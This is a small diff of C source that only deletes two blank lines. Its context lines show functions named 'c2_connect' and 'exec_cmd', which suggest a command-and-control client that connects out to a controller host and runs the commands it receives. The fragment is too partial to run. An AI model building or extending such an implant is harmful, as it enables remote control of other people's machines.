@@ -36,7 +36,6 @@ const SOCKET create_socket() {
 int c2_connect(const SOCKET connect_socket) {
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
-
 	hint.sin_port = htons(PORT);
 	inet_pton(AF_INET, HOST, &hint.sin_addr);
 
@@ -131,7 +130,6 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 
 	const int chunk = 24576;
 	int capacity = chunk;
-
 	char* output = malloc(capacity);
 	strcpy(output, buf);
 
